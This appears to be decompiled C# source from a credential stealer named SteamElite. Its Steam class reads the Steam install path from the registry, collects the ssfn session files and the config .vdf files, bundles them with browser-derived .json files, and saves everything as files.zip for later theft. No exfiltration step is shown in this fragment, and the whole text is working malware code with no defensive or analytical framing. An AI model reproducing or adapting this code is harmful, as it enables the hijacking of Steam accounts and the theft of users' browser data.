// Decompiled with JetBrains decompiler
// Type: Steam
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using Ionic.Zip;
using Microsoft.Win32;
using SteamElite;
using System.IO;

internal class Steam
{
  public static void GSteam()
  {
    try
    {
      string path1 = Program.path;
      string[] strArray1 = (string[]) null;
      string[] strArray2 = (string[]) null;
      try
      {
        string path2 = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam").GetValue("SteamPath").ToString();
        strArray1 = Directory.GetFiles(path2, "ssfn*");
        strArray2 = Directory.GetFiles(path2 + "\\config\\", "*.vdf");
      }
      catch
      {
      }
      string[] files = Directory.GetFiles(path1, "*.json");
      using (ZipFile zipFile = new ZipFile())
      {
        try
        {
          foreach (string str in files)
            zipFile.AddFile(str, "Browsers");
        }
        catch
        {
        }
        try
        {
          foreach (string str in strArray1)
            zipFile.AddFile(str, nameof (Steam));
        }
        catch
        {
        }
        try
        {
          foreach (string str in strArray2)
            zipFile.AddFile(str, "steam/config");
        }
        catch
        {
        }
        zipFile.Save(path1 + "files.zip");
      }
    }
    catch
    {
    }
  }
}
